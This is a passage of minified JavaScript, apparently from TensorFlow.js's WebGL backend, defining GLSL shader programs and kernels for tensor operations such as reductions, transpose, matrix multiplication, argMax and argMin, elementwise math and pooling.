inIdx + 1),\n            getValue(batch, inIdx + 2),\n            initializationValue\n          );\n\n          ${h}\n        }\n        setOutput(${l});\n      }\n    `
        }
    }
    function No(n, t, e, s) {
        const o = function IX(n) {
            const t = [];
            for (; 0 === t.length || 1 !== t[t.length - 1].outSize; ) {
                const e = t.length ? t[t.length - 1].outSize : n[1]
                  , s = Ac(e);
                t.push({
                    inSize: e,
                    windowSize: s,
                    outSize: Math.ceil(e / s)
                })
            }
            return t
        }(n.shape);
        let r = n;
        for (let i = 0; i < o.length; i++) {
            const {inSize: a, windowSize: c, outSize: l} = o[i];
            let u, d;
            u = "mean" === e ? 0 === i ? new X1({
                windowSize: c,
                inSize: a,
                batchSize: n.shape[0],
                outSize: l
            },a) : new X1({
                windowSize: c,
                inSize: a,
                batchSize: n.shape[0],
                outSize: l
            }) : new yX({
                windowSize: c,
                inSize: a,
                batchSize: n.shape[0],
                outSize: l
            },e),
            d = r,
            r = s.runWebGLProgram(u, [r], t),
            d.dataId !== n.dataId && s.disposeIntermediateTensorInfo(d)
        }
        return r
    }
    class wX {
        constructor(t, e) {
            this.variableNames = ["A"];
            const s = new Array(t.length);
            for (let i = 0; i < s.length; i++)
                s[i] = t[e[i]];
            this.outputShape = s,
            this.rank = s.length;
            const o = Wt(this.rank)
              , r = function CX(n) {
                const t = n.length;
                if (t > 6)
                    throw Error(`Transpose for rank ${t} is not yet supported`);
                const e = ["resRC.x", "resRC.y", "resRC.z", "resRC.w", "resRC.u", "resRC.v"]
                  , s = new Array(t);
                for (let o = 0; o < n.length; o++)
                    s[n[o]] = e[o];
                return s.join()
            }(e);
            this.userCode = `\n    void main() {\n      ${o} resRC = getOutputCoords();\n      setOutput(getA(${r}));\n    }\n    `
        }
    }
    class vX {
        constructor(t, e) {
            this.variableNames = ["A"],
            this.packedInputs = !0,
            this.packedOutput = !0;
            const s = new Array(t.length);
            for (let u = 0; u < s.length; u++)
                s[u] = t[e[u]];
            if (this.outputShape = s,
            this.rank = s.length,
            this.rank > 6)
                throw Error(`Packed transpose for rank ${this.rank} is not yet supported.`);
            const o = Wt(this.rank)
              , r = k1("rc", this.rank)
              , i = new Array(this.rank);
            for (let u = 0; u < e.length; u++)
                i[e[u]] = r[u];
            const a = `vec2(${i.slice(-2).join()})`
              , c = `++${r[this.rank - 1]} < ${s[this.rank - 1]}`
              , l = `getChannel(getA(${i.join()}), ${a})`;
            this.userCode = `\n    void main() {\n      ${o} rc = getOutputCoords();\n      vec4 result = vec4(0.);\n      result[0] = ${l};\n      if(${c}) {\n        result[1] = ${l};\n      }\n      --${r[this.rank - 1]};\n      if(++${r[this.rank - 2]} < ${s[this.rank - 2]}) {\n        result[2] = ${l};\n        if(${c}) {\n          result[3] = ${l};\n        }\n      }\n      setOutput(result);\n    }\n    `
        }
    }
    function $l(n, t, e) {
        const s = z().getBool("WEBGL_PACK_ARRAY_OPERATIONS") ? new vX(n.shape,t) : new wX(n.shape,t);
        return e.runWebGLProgram(s, [n], n.dtype)
    }
    function Gl(n) {
        const {inputs: t, backend: e, attrs: s} = n
          , {x: o} = t
          , {axis: r, keepDims: i} = s;
        return function SX(n, t, e, s) {
            const o = t
              , r = n.shape.length
              , i = It(o, n.shape);
            let a = i;
            const c = Yt(a, r)
              , l = null != c;
            let u = n;
            l && (u = $l(n, c, s),
            a = ee(a.length, r)),
            Ie("sum", a, r);
            const [d,h] = me(u.shape, a);
            let p = d;
            e && (p = re(d, i));
            const f = Z(h)
              , b = tt({
                inputs: {
                    x: u
                },
                attrs: {
                    shape: [Z(n.shape) / f, f]
                },
                backend: s
            })
              , I = No(b, nd(n.dtype), "sum", s)
              , y = tt({
                inputs: {
                    x: I
                },
                attrs: {
                    shape: p
                },
                backend: s
            });
            return s.disposeIntermediateTensorInfo(b),
            s.disposeIntermediateTensorInfo(I),
            l && s.disposeIntermediateTensorInfo(u),
            y
        }(o, r, i, e)
    }
    const kX = {
        kernelName: hc,
        backendName: "webgl",
        kernelFunc: Gl
    };
    function Me(n) {
        const {inputs: t, backend: e, attrs: s} = n
          , {x: o} = t
          , {perm: r} = s
          , i = e
          , a = o.shape.length
          , c = new Array(a);
        for (let u = 0; u < c.length; u++)
            c[u] = o.shape[r[u]];
        let l;
        if (i.shouldExecuteOnCPU([o])) {
            const d = i.texData.get(o.dataId).values
              , h = Gp(d, o.shape, o.dtype, r, c);
            l = i.makeTensorInfo(c, o.dtype);
            i.texData.get(l.dataId).values = h
        } else
            l = $l(o, r, i);
        return l
    }
    const TX = {
        kernelName: zo,
        backendName: "webgl",
        kernelFunc: Me
    }
      , A1 = 1e3;
    function Ll({a: n, b: t, transposeA: e, transposeB: s, backend: o, bias: r=null, preluActivationWeights: i=null, leakyreluAlpha: a=0, activation: c=null}) {
        const l = n.shape.length
          , u = t.shape.length
          , d = e ? n.shape[l - 2] : n.shape[l - 1]
          , h = s ? t.shape[u - 1] : t.shape[u - 2]
          , p = e ? n.shape[l - 1] : n.shape[l - 2]
          , f = s ? t.shape[u - 2] : t.shape[u - 1]
          , m = n.shape.slice(0, -2)
          , g = t.shape.slice(0, -2)
          , b = Z(m)
          , x = Z(g)
          , y = gt(n.shape.slice(0, -2), t.shape.slice(0, -2)).concat([p, f]);
        v(d === h, (()=>`Error in matMul: inner shapes (${d}) and (${h}) of Tensors with shapes ${n.shape} and ${t.shape} and transposeA=${e} and transposeB=${s} must match.`));
        const w = e ? [b, d, p] : [b, p, d]
          , C = s ? [x, f, h] : [x, h, f]
          , k = tt({
            inputs: {
                x: n
            },
            backend: o,
            attrs: {
                shape: w
            }
        })
          , S = tt({
            inputs: {
                x: t
            },
            backend: o,
            attrs: {
                shape: C
            }
        })
          , T = [k, S]
          , R = Math.max(b, x)
          , L = e ? k.shape[1] : k.shape[2]
          , V = null != r
          , F = null != i
          , X = "leakyrelu" === c
          , A = null != c ? aa(c, !0) : null;
        let B;
        if ((1 === p || 1 === f) && L > A1 && !1 === (V || F || X || null != A)) {
            let H = k
              , U = S;
            e && (H = Me({
                inputs: {
                    x: k
                },
                backend: o,
                attrs: {
                    perm: [0, 2, 1]
                }
            }),
            T.push(H)),
            s && (U = Me({
                inputs: {
                    x: S
                },
                backend: o,
                attrs: {
                    perm: [0, 2, 1]
                }
            }),
            T.push(U));
            const j = 1 === f;
            let J = H;
            1 !== f && (J = tt({
                inputs: {
                    x: H
                },
                backend: o,
                attrs: {
                    shape: [R, L, 1]
                }
            }),
            T.push(J));
            const nt = 1 === f ? 2 : 1;
            let q = U;
            j && (q = tt({
                inputs: {
                    x: U
                },
                backend: o,
                attrs: {
                    shape: [R, 1, L]
                }
            }),
            T.push(q));
            const rt = Ep({
                inputs: {
                    a: J,
                    b: q
                },
                backend: o
            });
            B = Gl({
                inputs: {
                    x: rt
                },
                backend: o,
                attrs: {
                    axis: nt,
                    keepDims: !0
                }
            }),
            T.push(rt)
        } else {
            const H = _e(n.dtype, t.dtype)
              , U = new M1(w,C,[R, p, f],e,s,V,A,F,X)
              , Y = [k, S];
            if (null != r && Y.push(r),
            F && Y.push(i),
            X) {
                const j = o.makeTensorInfo([], "float32", gs(a, "float32"));
                Y.push(j),
                T.push(j)
            }
            B = o.runWebGLProgram(U, Y, H)
        }
        const K = tt({
            inputs: {
                x: B
            },
            backend: o,
            attrs: {
                shape: y
            }
        });
        T.push(B);
        for (const H of T)
            o.disposeIntermediateTensorInfo(H);
        return K
    }
    const RX = {
        kernelName: yc,
        backendName: "webgl",
        kernelFunc: function NX(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {a: o, b: r, bias: i, preluActivationWeights: a} = t
              , {transposeA: c, transposeB: l, activation: u, leakyreluAlpha: d} = s;
            return Ll({
                a: o,
                b: r,
                transposeA: c,
                transposeB: l,
                backend: e,
                bias: i,
                preluActivationWeights: a,
                leakyreluAlpha: d,
                activation: u
            })
        }
    }
      , P1 = "return abs(x);";
    const GX = {
        kernelName: ya,
        backendName: "webgl",
        kernelFunc: function $X(n) {
            const {inputs: t, backend: e} = n
              , {x: s} = t;
            if (e.shouldExecuteOnCPU([s]) && "complex64" !== s.dtype) {
                const r = e.texData.get(s.dataId)
                  , i = v1(r.values);
                return e.makeTensorInfo(s.shape, s.dtype, i)
            }
            let o;
            return o = z().getBool("WEBGL_PACK_UNARY_OPERATIONS") ? new Fs(s.shape,P1) : new jn(s.shape,P1),
            e.runWebGLProgram(o, [s], s.dtype)
        }
    }
      , EX = Tt({
        opSnippet: Cn + "\n  if (abs(x) > 1.) {\n    return NAN;\n  }\n  return acos(x);\n"
    })
      , DX = {
        kernelName: vr,
        backendName: "webgl",
        kernelFunc: EX
    }
      , MX = Tt({
        opSnippet: Cn + "\n  if (x < 1.0) return NAN;\nreturn log(x + sqrt(x * x - 1.0));"
    })
      , VX = {
        kernelName: Sr,
        backendName: "webgl",
        kernelFunc: MX
    }
      , O1 = "return a + b;"
      , FX = Ce({
        opSnippet: O1,
        packedOpSnippet: O1,
        supportsComplex: !0,
        cpuKernelImpl: _F
    })
      , zX = {
        kernelName: Fo,
        backendName: "webgl",
        kernelFunc: FX
    };
    class XX {
        constructor(t, e) {
            this.outputShape = [],
            this.outputShape = t,
            this.variableNames = e.map(((r,i)=>`T${i}`));
            const s = [];
            this.variableNames.forEach((r=>{
                s.push(`float v${r} = get${r}AtOutCoords();`)
            }
            ));
            const o = this.variableNames.map((r=>`v${r}`)).join(" + ");
            this.userCode = `\n      void main() {\n        ${s.join("\n        ")}\n\n        float result = ${o};\n        setOutput(result);\n      }\n    `
        }
    }
    class AX {
        constructor(t, e) {
            this.outputShape = [],
            this.packedInputs = !0,
            this.packedOutput = !0,
            this.outputShape = t,
            this.variableNames = e.map(((r,i)=>`T${i}`));
            const s = [];
            this.variableNames.forEach((r=>{
                s.push(`vec4 v${r} = get${r}AtOutCoords();`)
            }
            ));
            const o = this.variableNames.map((r=>`v${r}`)).join(" + ");
            this.userCode = `\n      void main() {\n        ${s.join("\n        ")}\n\n        vec4 result = ${o};\n        setOutput(result);\n      }\n    `
        }
    }
    const PX = {
        kernelName: nu,
        backendName: "webgl",
        kernelFunc: function El(n) {
            const {inputs: t, backend: e} = n
              , s = t;
            if (1 === s.length)
                return Je({
                    inputs: {
                        x: s[0]
                    },
                    backend: e
                });
            if (s.length > z().getNumber("WEBGL_MAX_TEXTURES_IN_SHADER")) {
                const c = Math.floor(s.length / 2)
                  , l = El({
                    inputs: s.slice(0, c),
                    backend: e
                })
                  , u = El({
                    inputs: s.slice(c),
                    backend: e
                });
                return El({
                    inputs: [l, u],
                    backend: e
                })
            }
            const o = s.map((c=>c.dtype)).reduce(((c,l)=>_e(c, l)))
              , r = s.map((c=>c.shape))
              , a = z().getBool("WEBGL_PACK") ? new AX(s[0].shape,r) : new XX(s[0].shape,r);
            return e.runWebGLProgram(a, s, o)
        }
    };
    const KX = {
        kernelName: "All",
        backendName: "webgl",
        kernelFunc: function OX(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {axis: r, keepDims: i} = s
              , a = o.shape.length
              , c = It(r, o.shape);
            let l = c;
            const u = Yt(l, a);
            let d = o;
            null != u && (d = Me({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    perm: u
                }
            }),
            l = ee(l.length, a)),
            Ie("all", l, a);
            const [h,p] = me(d.shape, l)
              , m = tt({
                inputs: {
                    x: d
                },
                backend: e,
                attrs: {
                    shape: [-1, Z(p)]
                }
            })
              , g = No(m, m.dtype, "all", e);
            let b;
            if (i) {
                b = tt({
                    inputs: {
                        x: g
                    },
                    backend: e,
                    attrs: {
                        shape: re(h, c)
                    }
                })
            } else
                b = tt({
                    inputs: {
                        x: g
                    },
                    backend: e,
                    attrs: {
                        shape: h
                    }
                });
            return e.disposeIntermediateTensorInfo(m),
            e.disposeIntermediateTensorInfo(g),
            null != u && e.disposeIntermediateTensorInfo(d),
            b
        }
    };
    const BX = {
        kernelName: "Any",
        backendName: "webgl",
        kernelFunc: function ZX(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {axis: r, keepDims: i} = s
              , a = o.shape.length
              , c = It(r, o.shape);
            let l = c;
            const u = Yt(l, a);
            let d = o;
            null != u && (d = Me({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    perm: u
                }
            }),
            l = ee(l.length, a)),
            Ie("any", l, a);
            const [h,p] = me(d.shape, l)
              , m = tt({
                inputs: {
                    x: d
                },
                backend: e,
                attrs: {
                    shape: [-1, Z(p)]
                }
            })
              , g = No(m, m.dtype, "any", e);
            let b;
            if (i) {
                b = tt({
                    inputs: {
                        x: g
                    },
                    backend: e,
                    attrs: {
                        shape: re(h, c)
                    }
                })
            } else
                b = tt({
                    inputs: {
                        x: g
                    },
                    backend: e,
                    attrs: {
                        shape: h
                    }
                });
            return e.disposeIntermediateTensorInfo(m),
            e.disposeIntermediateTensorInfo(g),
            null != u && e.disposeIntermediateTensorInfo(d),
            b
        }
    };
    class HX {
        constructor(t, e, s) {
            this.variableNames = ["A"];
            const {windowSize: o, batchSize: r, outSize: i} = t;
            s || this.variableNames.push("bestIndicesA"),
            this.outputShape = [r, i];
            const a = "max" === e ? ">" : "<"
              , c = s ? "inOffset + i;" : "round(getBestIndicesA(batch, inOffset + i));";
            this.userCode = `\n      void main() {\n        ivec2 coords = getOutputCoords();\n        int batch = coords[0];\n        int outIdx = coords[1];\n        int inOffset = outIdx * ${o};\n\n        int bestIndex = inOffset;\n        float bestValue = getA(batch, bestIndex);\n\n        for (int i = 0; i < ${o}; i++) {\n          int inIdx = ${c};\n          float candidate = getA(batch, inIdx);\n          if (candidate ${a} bestValue) {\n            bestValue = candidate;\n            bestIndex = inIdx;\n          }\n        }\n        setOutput(float(bestIndex));\n      }\n    `
        }
    }
    class _X {
        constructor(t, e, s, o) {
            this.variableNames = ["A"],
            this.packedInputs = !0,
            this.packedOutput = !0,
            v(t.length > 2, (()=>`Packed arg${s.charAt(0).toUpperCase() + s.slice(1)} supports only inputs with rank above 2.`));
            const r = t[t.length - 1]
              , i = Math.ceil(r / e);
            this.outputShape = t.slice(0, -1),
            i > 1 && this.outputShape.push(i),
            o || this.variableNames.push("bestIndicesA");
            const a = this.outputShape
              , c = a.length
              , l = Wt(c)
              , u = We("coords", c);
            let d, h;
            if (1 === i) {
                h = c + 1;
                const S = Wt(h);
                d = `\n        ${S} sourceLocR = ${S}(${u.join()}, 0);\n        ++${u[c - 1]};\n        ${S} sourceLocG = ${S}(${u.join()}, 0);\n        ++${u[c - 2]};\n        ${S} sourceLocA = ${S}(${u.join()}, 0);\n        --${u[c - 1]};\n        ${S} sourceLocB = ${S}(${u.join()}, 0);\n        --${u[c - 2]};`
            } else
                h = c,
                d = `\n        ${l} sourceLocR = coords;\n        ++${u[c - 1]};\n        ${l} sourceLocG = coords;\n        ++${u[c - 2]};\n        ${l} sourceLocA = coords;\n        --${u[c - 1]};\n        ${l} sourceLocB = coords;\n        --${u[c - 2]};`;
            const p = ["x", "y", "z", "w", "u", "v"].slice(0, h)
              , f = "." + p[h - 1]
              , m = p.map((S=>"int " + S))
              , g = We("sourceLocR", h - 1).concat("inIdx.r")
              , b = We("sourceLocG", h - 1).concat("inIdx.g")
              , x = We("sourceLocB", h - 1).concat("inIdx.b")
              , I = We("sourceLocA", h - 1).concat("inIdx.a")
              , y = "max" === s ? "greaterThan" : "lessThan"
              , w = o ? "" : `\n          inIdx = round(vec4(getBestIndicesAChannel(${g.join()}),\n                             getBestIndicesAChannel(${b.join()}),\n                             getBestIndicesAChannel(${x.join()}),\n                             getBestIndicesAChannel(${I.join()})));`
              , C = `vec4(\n            getAChannel(${g.join()}),\n            hasNextCol ? getAChannel(${b.join()}) : 0.,\n            hasNextRow ? getAChannel(${x.join()}) : 0.,\n            hasNextRow && hasNextCol ? getAChannel(${I.join()}) : 0.)`
              , k = o ? "" : `\n      float getBestIndicesAChannel(${m.join()}) {\n        return getChannel(getBestIndicesA(${p.join()}),\n                                          vec2(${p.slice(-2).join()}));\n      }`;
            this.userCode = `\n      float getAChannel(${m.join()}) {\n        return getChannel(getA(${p.join()}),\n                               vec2(${p.slice(-2).join()}));\n      }\n      ${k}\n      void main() {\n        ${l} coords = getOutputCoords();\n        bool hasNextCol = ${u[c - 1]} < ${a[c - 1] - 1};\n        bool hasNextRow = ${u[c - 2]} < ${a[c - 2] - 1};\n        ${d}\n        ivec4 srcIdx = ivec4(sourceLocR${f}, sourceLocG${f},\n          sourceLocB${f}, sourceLocA${f}) * ${e};\n        ivec4 inIdx = srcIdx;\n        vec4 bestIndex = vec4(inIdx);\n        vec4 bestValue = ${C};\n\n        for (int i = 0; i < ${e}; i++) {\n          inIdx = srcIdx;\n          ${w}\n          vec4 candidate = ${C};\n          bvec4 nan = isnan(candidate);\n          bvec4 replace = bvec4(\n            vec4(${y}(candidate, bestValue)) * (vec4(1.0) - vec4(nan)));\n\n          bestValue = vec4(replace.x  ? candidate.x : bestValue.x,\n                           replace.y  ? candidate.y : bestValue.y,\n                           replace.z  ? candidate.z : bestValue.z,\n                           replace.w  ? candidate.w : bestValue.w);\n          bestIndex = mix(bestIndex, vec4(inIdx), vec4(replace));\n          srcIdx++;\n        }\n        setOutput(bestIndex);\n      }\n    `
        }
    }
    function K1(n, t, e, s=null) {
        let o = t.shape[0]
          , r = t.shape[1];
        null != s && (o = s.shape[0],
        r = s.shape[1]);
        const i = Ac(r)
          , a = {
            windowSize: i,
            inSize: r,
            batchSize: o,
            outSize: Math.ceil(r / i)
        }
          , c = new HX(a,e,null == s)
          , l = [t];
        null != s && l.push(s);
        const u = n.runWebGLProgram(c, l, "int32");
        if (1 === u.shape[1])
            return u;
        const d = K1(n, t, e, u);
        return n.disposeIntermediateTensorInfo(u),
        d
    }
    function Z1(n, t, e, s=null) {
        const o = null != s ? s.shape : t.shape
          , i = Ac(o[o.length - 1])
          , a = new _X(o,i,e,null == s)
          , c = null == s ? [t] : [t, s]
          , l = n.runWebGLProgram(a, c, "int32");
        if (l.shape.length === t.shape.length) {
            const u = Z1(n, t, e, l);
            return n.disposeIntermediateTensorInfo(l),
            u
        }
        return l
    }
    function B1(n, t, e, s) {
        const o = [e];
        if (Ie("arg" + s.charAt(0).toUpperCase() + s.slice(1), o, t.shape.length),
        !z().getBool("WEBGL_PACK_REDUCE") || t.shape.length <= 2) {
            const r = []
              , i = n.texData.get(t.dataId);
            let c = t;
            null !== i && i.isPacked && (c = n.unpackTensor(t),
            r.push(c));
            const [l,u] = me(c.shape, o)
              , d = Z(u)
              , h = tt({
                inputs: {
                    x: c
                },
                backend: n,
                attrs: {
                    shape: [-1, d]
                }
            });
            r.push(h);
            const p = K1(n, h, s);
            r.push(p);
            const f = tt({
                inputs: {
                    x: p
                },
                backend: n,
                attrs: {
                    shape: l
                }
            });
            return r.forEach((m=>n.disposeIntermediateTensorInfo(m))),
            f
        }
        return Z1(n, t, s)
    }
    const YX = {
        kernelName: Ia,
        backendName: "webgl",
        kernelFunc: function UX(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {axis: r} = s;
            let i = It(r, o.shape);
            const a = Yt(i, o.shape.length);
            let c = o;
            const l = [];
            null != a && (c = Me({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    perm: a
                }
            }),
            l.push(c),
            i = ee(i.length, c.shape.length)),
            Ie("argMax", [i[0]], c.shape.length);
            const u = B1(e, c, i[0], "max");
            return l.forEach((d=>e.disposeIntermediateTensorInfo(d))),
            u
        }
    };
    const JX = {
        kernelName: wa,
        backendName: "webgl",
        kernelFunc: function QX(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {axis: r} = s;
            let i = It(r, o.shape);
            const a = Yt(i, o.shape.length);
            let c = o;
            const l = [];
            null != a && (c = Me({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    perm: a
                }
            }),
            l.push(c),
            i = ee(i.length, c.shape.length)),
            Ie("argMin", [i[0]], c.shape.length);
            const u = B1(e, c, i[0], "min");
            return l.forEach((d=>e.disposeIntermediateTensorInfo(d))),
            u
        }
    }
      , qX = Tt({
        opSnippet: Cn + "\n  if (abs(x) > 1.) {\n    return NAN;\n  }\n  return asin(x);\n"
    })
      , tA = {
        kernelName: kr,
        backendName: "webgl",
        kernelFunc: qX
    }
      , nA = Tt({
        opSnippet: Cn + "return log(x + sqrt(x * x + 1.0));"
    })
      , sA = {
        kernelName: Tr,
        backendName: "webgl",
        kernelFunc: nA
    }
      , rA = Tt({
        opSnippet: Cn + "\n  return atan(x);\n"
    })
      , iA = {
        kernelName: Nr,
        backendName: "webgl",
        kernelFunc: rA
    }
      , lA = Ce({
        opSnippet: Lp + "\n  return atan(a, b);\n",
        packedOpSnippet: "\n  vec4 result = atan(a, b);\n  bvec4 isNaNA = isnan(a);\n  bvec4 isNaNB = isnan(b);\n  bvec4 isNaN = bvec4(isNaNA.x || isNaNB.x, isNaNA.y || isNaNB.y, isNaNA.z || isNaNB.z, isNaNA.w || isNaNB.w);\n  " + To + "\n  return result;\n"
    })
      , uA = {
        kernelName: $r,
        backendName: "webgl",
        kernelFunc: lA
    }
      , hA = Tt({
        opSnippet: Cn + "\n  if ((x < -1.0) || (x > 1.0)) return NAN;\nreturn (log(1.0 + x) - log(1.0 - x)) / 2.0;"
    })
      , pA = {
        kernelName: Rr,
        backendName: "webgl",
        kernelFunc: hA
    };
    class ca {
        constructor(t, e, s, o=!1, r=!1) {
            if (this.variableNames = ["x"],
            "avg" === e && s)
                throw new Error("Cannot compute positions for average pool.");
            const i = t.filterWidth
              , a = t.strideHeight
              , c = t.strideWidth
              , l = t.dilationHeight
              , u = t.dilationWidth
              , d = t.effectiveFilterHeight
              , h = t.effectiveFilterWidth
              , p = t.padInfo.top
              , f = t.padInfo.left;
            this.outputShape = t.outShape;
            const m = "avg" === e
              , g = `((batch  * ${t.inHeight} + xR) * ${t.inWidth} + xC) * ${t.inChannels} + d`
              , b = `(xR * ${t.inWidth} + xC) * ${t.inChannels} + d`;
            let x = "0.0";
            if (m || (x = "-1.0 / 1e-20"),
            s) {
                const S = ">=";
                return void (this.userCode = `\n        const ivec2 strides = ivec2(${a}, ${c});\n        const ivec2 pads = ivec2(${p}, ${f});\n\n        void main() {\n          ivec4 coords = getOutputCoords();\n          int batch = coords[0];\n          int d = coords[3];\n\n          ivec2 xRCCorner = coords.yz * strides - pads;\n          int xRCorner = xRCCorner.x;\n          int xCCorner = xRCCorner.y;\n\n          // max/min x(?, ?, d) to get y(yR, yC, d).\n          // ? = to be determined\n          float minMaxValue = 0.0;\n          float minMaxValueFound = 0.0;\n          int minMaxPosition = 0;\n          float avgValue = 0.0;\n\n          for (int wR = 0; wR < ${d};\n              wR += ${l}) {\n            int xR = xRCorner + wR;\n\n            if (xR < 0 || xR >= ${t.inHeight}) {\n              continue;\n            }\n\n            for (int wC = 0; wC < ${h};\n                wC += ${u}) {\n              int xC = xCCorner + wC;\n\n              if (xC < 0 || xC >= ${t.inWidth}) {\n                continue;\n              }\n\n              float value = getX(batch, xR, xC, d);\n\n              // If a min / max value has already been found, use it. If not,\n              // use the current value.\n              float currMinMaxValue = mix(\n                  value, minMaxValue, minMaxValueFound);\n              if (value ${S} currMinMaxValue) {\n                minMaxValue = value;\n                minMaxValueFound = 1.0;\n                minMaxPosition = ${o ? r ? g : b : `wR * ${h} + wC`};\n              }\n            }\n          }\n          setOutput(float(minMaxPosition));\n        }\n      `)
            }
            let y = `${e}(${e}(${e}(minMaxValue[0], minMaxValue[1]), minMaxValue[2]), minMaxValue[3])`;
            "avg" === e && (y = "avgValue / max(count, 1.0)");
            const w = 4 * Math.floor(i / 4)
              , C = i % 4
              , k = `\n      if (${m}) {\n        avgValue += dot(values, ones);\n      } else {\n        minMaxValue = max(values, minMaxValue);\n      }\n    `;
            this.userCode = `\n      const ivec2 strides = ivec2(${a}, ${c});\n      const ivec2 pads = ivec2(${p}, ${f});\n      const float initializationValue = ${x};\n      const vec4 ones = vec4(1.0, 1.0, 1.0, 1.0);\n\n      float count = 0.0;\n\n      float getValue(int batch, int xR, int xC, int d) {\n        if (xC < 0 || xC >= ${t.inWidth}) {\n          return initializationValue;\n        }\n        count += 1.0;\n        return getX(batch, xR, xC, d);\n      }\n\n      void main() {\n        ivec4 coords = getOutputCoords();\n        int batch = coords[0];\n        int d = coords[3];\n\n        ivec2 xRCCorner = coords.yz * strides - pads;\n        int xRCorner = xRCCorner.x;\n        int xCCorner = xRCCorner.y;\n\n        // max/min x(?, ?, d) to get y(yR, yC, d).\n        // ? = to be determined\n        vec4 minMaxValue = vec4(${x});\n        float avgValue = 0.0;\n        count = 0.0;\n\n        for (int wR = 0; wR < ${d};\n            wR += ${l}) {\n          int xR = xRCorner + wR;\n\n          if (xR < 0 || xR >= ${t.inHeight}) {\n            continue;\n          }\n\n          for (int wC = 0; wC < ${w}; wC += 4) {\n            int xC = xCCorner + wC * ${u};\n\n            vec4 values = vec4(\n              getValue(batch, xR, xC, d),\n              getValue(batch, xR, xC + ${u}, d),\n              getValue(batch, xR, xC + 2 * ${u}, d),\n              getValue(batch, xR, xC + 3 * ${u}, d)\n            );\n\n            ${k}\n          }\n\n          int xC = xCCorner + ${w};\n          if (${1 === C}) {\n            vec4 values = vec4(\n              getValue(batch, xR, xC, d),\n              initializationValue,\n              initializationValue,\n              initializationValue\n            );\n\n            ${k}\n          } else if (${2 === C}) {\n            vec4 values = vec4(\n              getValue(batch, xR, xC, d),\n              getValue(batch, xR, xC + ${u}, d),\n              initializationValue,\n              initializationValue\n            );\n\n            ${k}\n          } else if (${3 === C}) {\n            vec4 values = vec4(\n              getValue(batch, xR, xC, d),\n              getValue(batch, xR, xC + ${u}, d),\n              getValue(batch, xR, xC + 2 * ${u}, d),\n              initializationValue\n            );\n\n            ${k}\n          }\n        }\n        setOutput(${y});\n      }\n    `
        }
    }
    class Dp {
        constructor(t, e, s, o=!1, r=!1) {
            if (this.variableNames = ["x"],
            "avg" === e && s)
                throw new Error("Cannot compute positions for average pool.");
            const i = t.filterWidth
              , a = t.strideDepth
              , c = t.strideHeight
              , l = t.strideWidth
              , u = t.dilationDepth
              , d = t.dilationHeight
              , h = t.dilationWidth
              , p = t.effectiveFilterDepth
              , f = t.effectiveFilterHeight
              , m = t.effectiveFilterWidth
              , g = t.padInfo.front
              , b = t.padInfo.top
              , x = t.padInfo.left;
            this.outputShape = t.outShape;
            const I = "avg" === e;
            let y = "0.0";
            if (I || (y = "-1.0 / 1e-20"),
            s) {
                const R = ">=";
                return void (this.userCode = `\n        const ivec3 strides =\n            ivec3(${a}, ${c}, ${l});\n        const ivec3 pads = ivec3(${g}, ${b}, ${x});\n\n        void main() {\n          ivec5 coords = getOutputCoords();\n          int batch = coords.x;\n          int ch = coords.u;\n\n          ivec3 xCorner = ivec3(coords.y, coords.z, coords.w) * strides - pads;\n          int xDCorner = xCorner.x;\n          int xRCorner = xCorner.y;\n          int xCCorner = xCorner.z;\n\n          // max/min x(?, ?, ?, ch) to get y(yD, yR, yC, ch).\n          // ? = to be determined\n          float minMaxValue = 0.0;\n          float minMaxValueFound = 0.0;\n          int minMaxPosition = 0;\n\n          for (int wD = 0; wD < ${p};\n              wD += ${u}) {\n            int xD = xDCorner + wD;\n\n            if (xD < 0 || xD >= ${t.inDepth}) {\n              continue;\n            }\n\n            for (int wR = 0; wR < ${f};\n                wR += ${d}) {\n              int xR = xRCorner + wR;\n\n              if (xR < 0 || xR >= ${t.inHeight}) {\n                continue;\n              }\n\n              for (int wC = 0; wC < ${m};\n                  wC += ${h}) {\n                int xC = xCCorner + wC;\n\n                if (xC < 0 || xC >= ${t.inWidth}) {\n                  continue;\n                }\n\n                float value = getX(batch, xD, xR, xC, ch);\n\n                // If a min / max value has already been found, use it. If not,\n                // use the current value.\n                float currMinMaxValue = mix(\n                    value, minMaxValue, minMaxValueFound);\n                if (value ${R} currMinMaxValue) {\n                  minMaxValue = value;\n                  minMaxValueFound = 1.0;\n                  minMaxPosition = ${o ? r ? `(((batch * ${t.inDepth} + xD) * ${t.inHeight} + xR) * ${t.inWidth} + xC) * ${t.inChannels} + ch` : `((xD * ${t.inHeight} + xR) * ${t.inWidth} + xC) * ${t.inChannels} + ch` : `wD * ${f} * ${m} +\n                      wR * ${m} + wC`};\n                }\n              }\n            }\n          }\n          setOutput(float(minMaxPosition));\n        }\n      `)
            }
            let C = `${e}(${e}(${e}(minMaxValue[0], minMaxValue[1]), minMaxValue[2]), minMaxValue[3])`;
            "avg" === e && (C = "avgValue / max(count, 1.0)");
            const k = 4 * Math.floor(i / 4)
              , S = i % 4
              , T = `\n      if (${I}) {\n        avgValue += dot(values, ones);\n      } else {\n        minMaxValue = max(values, minMaxValue);\n      }\n    `;
